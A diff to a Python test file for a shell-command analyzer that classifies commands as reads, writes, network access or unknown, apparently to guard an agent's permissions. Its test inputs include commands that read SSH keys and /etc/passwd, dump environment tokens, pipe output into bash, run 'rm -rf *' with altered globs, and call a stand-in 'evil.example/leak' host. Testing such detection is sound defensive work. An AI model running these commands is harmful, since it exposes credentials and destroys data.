@@ -183,11 +183,11 @@ def test_paths_after_cd_are_taken_from_its_folder(command: str, writes: tuple[st
 
 def test_find_exec_paths_are_the_files_find_may_pass() -> None:
     [_, action] = analyze("find .git/hooks -name pre-commit -exec cp x {} \\;", inside)
-    assert ".git/hooks/pre-commit" in action.writes
+    assert ".git/hooks/**/pre-commit" in action.writes
     [_, action] = analyze("find . -name .env -exec cat {} +", inside)
-    assert "./.env" in action.reads
+    assert "./**/.env" in action.reads
     [_, action] = analyze("find .git -execdir rm config \\;", inside)
-    assert action.writes == (".git/config",)
+    assert action.writes == (".git/config", ".git/**/config")
 
 
 def test_a_pipe_into_a_shell_is_network_plus_unknown() -> None:
@@ -322,8 +322,8 @@ def test_exporting_a_risky_variable_is_unknown() -> None:
         ("cat < .env > out", (".env",), ("out",)),
         ("git show HEAD:.env", (".env",), ()),
         ("git diff --output=calc.py", (), ("calc.py",)),
-        ("find .git -delete", (), (".git",)),
-        ("find . -name '*.pyc' -delete", (), ("./*.pyc",)),
+        ("find .git -delete", (), (".git", ".git/**")),
+        ("find . -name '*.pyc' -delete", (), ("./**/*.pyc",)),  # at any depth
         ("find . -path './.git/*' -delete", (), ("./.git/*",)),
         ("ls .env", (), ()),
     ],
@@ -367,3 +367,197 @@ def test_reaching_outside_is_marked() -> None:
     assert analyze("cat < ~/.ssh/id_rsa", inside)[0].outside
     assert analyze("cat ~/.ssh/id_rsa", inside)[0].outside
     assert not analyze("some-unknown-tool", inside)[0].outside
+
+
+# -- audit findings
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "export CDPATH=~; cd .ssh && cat id_rsa",
+        "CDPATH=/ cd etc && cat hosts",
+        "export CDPATH=..; cd other-project && cat .env",
+        "declare -x CDPATH=/; cd etc; cat passwd",
+        "HOME=/etc cd",
+        "OLDPWD=/etc cd -",
+        "GLOBIGNORE=x rm -rf *",
+        "shopt -s dotglob; rm -rf *",
+        "shopt -s nocaseglob",
+    ],
+)
+def test_what_moves_cd_or_changes_globs_is_unknown(command: str) -> None:
+    assert kinds(command)[0][1] == Kind.UNKNOWN
+
+
+def test_cd_with_cdpath_inherited_is_unknown(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.delenv("CDPATH", raising=False)
+    assert [k for _, k in kinds("cd .ssh")] == [Kind.READ]
+    monkeypatch.setenv("CDPATH", "/Users/someone")
+    assert [k for _, k in kinds("cd .ssh")] == [Kind.UNKNOWN]
+    assert [k for _, k in kinds("cd src/pkg")] == [Kind.UNKNOWN]
+    for command in ("cd ./src", "cd ../work/src", "cd .", "cd /work/src"):
+        assert [k for _, k in kinds(command)] == [Kind.READ]  # CDPATH isn't looked up
+
+
+@pytest.mark.parametrize(
+    ("command", "kind"),
+    [
+        ("python3 -m pip list --outdated --index-url 'http://host/simple?k=SECRET'", Kind.NETWORK),
+        ("python3 -m pip list --outdated", Kind.NETWORK),
+        ("pip list -o", Kind.NETWORK),
+        ("pip list -lo", Kind.NETWORK),
+        ("pip list -i http://x/", Kind.NETWORK),
+        ("pip freeze --find-links=http://x/", Kind.NETWORK),
+        ("uv pip list --outdated --index-url http://x/", Kind.NETWORK),
+        ("uv pip list --outdated", Kind.NETWORK),
+        ("uv pip tree --outdated", Kind.NETWORK),
+        ("pip list", Kind.READ),
+        ("pip list --format=json", Kind.READ),
+        ("pip show -f requests", Kind.READ),  # -f lists files here
+        ("uv pip list", Kind.READ),
+        ("git remote show http://evil.example/leak", Kind.NETWORK),
+        ("git remote show origin", Kind.NETWORK),
+        ("git remote update", Kind.NETWORK),
+        ("git remote prune origin", Kind.NETWORK),
+        ("git remote show -n origin", Kind.READ),
+        ("git remote show", Kind.READ),
+        ("git remote -v", Kind.READ),
+        ("git remote get-url origin", Kind.READ),
+    ],
+)
+def test_listings_that_ask_a_server_use_the_network(command: str, kind: Kind) -> None:
+    assert [k for _, k in kinds(command)] == [kind]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "read PATH <<< .",
+        "read -r BASH_ENV <<< x.sh",
+        "read -ra PATH <<< .",
+        "read -p prompt -a IFS",
+        "read -r a CDPATH",
+        'read "$name"',
+        "printf -v PATH %s .",
+        "printf -vPATH %s .",
+        'printf -v "$name" %s .',
+        "declare -n p=PATH",
+        "local -n p=PATH",
+        "export PATH[0]=.",
+        'export "$name=."',
+    ],
+)
+def test_every_way_of_setting_a_risky_variable_is_unknown(command: str) -> None:
+    assert [k for _, k in kinds(command)] == [Kind.UNKNOWN]
+
+
+@pytest.mark.parametrize(
+    "command", ["read -r line", "read -r a b < f.txt", "printf '%s\\n' x", "declare -A map"]
+)
+def test_setting_other_variables_only_reads(command: str) -> None:
+    assert [k for _, k in kinds(command)] == [Kind.READ]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "jq -n env",
+        "jq -n '$ENV'",
+        "jq -n 'env.TOKEN'",
+        "jq -r --arg x y '$ENV.HOME' f.json",
+        "awk 'BEGIN{for(k in ENVIRON)print k,ENVIRON[k]}'",
+    ],
+)
+def test_jq_and_awk_printing_the_environment_is_unknown(command: str) -> None:
+    [action] = analyze(command, inside)
+    assert action.kind == Kind.UNKNOWN
+    assert "environment variables" in action.reason
+
+
+@pytest.mark.parametrize(
+    ("command", "kind"),
+    [
+        ("jq .env package.json", Kind.READ),  # a key named env
+        ("jq -r '.scripts.test' package.json", Kind.READ),
+        ("jq -f prog.jq f.json", Kind.UNKNOWN),
+        ("awk '{getline l < \".env\"; print l}' f", Kind.UNKNOWN),
+    ],
+)
+def test_other_jq_and_awk_programs(command: str, kind: Kind) -> None:
+    assert [k for _, k in kinds(command)] == [kind]
+
+
+@pytest.mark.parametrize(
+    ("command", "reads"),
+    [
+        ("diff --from-file=.env /dev/null", ("/dev/null", ".env")),
+        ("diff --to-file=.env a", ("a", ".env")),
+        ("date -f .env", (".env",)),
+        ("date -f.env", (".env",)),
+        ("date --file=.env", (".env",)),
+        ("grep --file=.env src", ("src", ".env")),
+        ("date +%s", ()),
+        ("date -d tomorrow +%F", ()),
+    ],
+)
+def test_files_named_in_options_are_reads(command: str, reads: tuple[str, ...]) -> None:
+    [action] = analyze(command, inside)
+    assert action.reads == reads
+
+
+def test_names_read_from_input_are_unknown() -> None:
+    [_, action] = analyze("printf '.env\\0' | sort --files0-from=-", inside)
+    assert action.kind == Kind.UNKNOWN
+    assert action.opaque
+    assert kinds("wc --files0-from=list.txt")[0][1] == Kind.UNKNOWN
+    assert kinds("date -f /etc/passwd")[0][1] == Kind.UNKNOWN  # outside, now that it's checked
+
+
+@pytest.mark.parametrize(
+    ("command", "writes"),
+    [
+        ("cp -rt dest a", ("dest", "dest/a")),
+        ("cp -tdest a", ("dest", "dest/a")),
+        ("mv -ft dest a", ("dest", "dest/a", "a")),
+        ("cp -S .t -r a b", ("b", "b/.t", "b/a")),  # -S takes a suffix, which isn't -t
+    ],
+)
+def test_copy_targets_in_groups_of_options(command: str, writes: tuple[str, ...]) -> None:
+    assert analyze(command, inside)[0].writes == writes
+
+
+@pytest.mark.parametrize(
+    ("command", "opaque"),
+    [
+        ("cat $(git ls-files)", True),
+        ("cat $f", True),
+        ("echo x > $out", True),
+        ('bash -c "$X"', True),
+        ("git log | bash", True),
+        ("bash <<< 'ls'", True),
+        ("bash < script.sh", False),
+        ("bash <<'EOF'\nls\nEOF", False),  # the here-document shows what runs
+        ("cat x | python3", True),
+        ("cat x | python3 -", True),
+        ("node", True),
+        ("perl -ne 'print' f", False),
+        ("python3 -c 'print(1)'", False),
+        ("python3 -W ignore x.py", False),
+        ("python3 --version", False),
+        ("env -C src ls", True),
+        ("PATH=. ls", True),
+        ("cat notes.txt", False),
+        ("cat ~/.ssh/id_rsa.pub", False),  # outside, but the text says which file
+    ],
+)
+def test_commands_whose_text_doesnt_show_what_runs_are_opaque(command: str, opaque: bool) -> None:
+    assert analyze(command, inside)[-1].opaque == opaque
+
+
+def test_env_keeps_the_command_it_runs_for_deny_rules() -> None:
+    [action] = analyze("env -C src git -C . push origin main", inside)
+    assert action.kind == Kind.UNKNOWN
+    assert action.bare == "git push origin main"
+    [action] = analyze("env --split-string='rm -rf x'", inside)
+    assert action.bare == "rm -rf x"
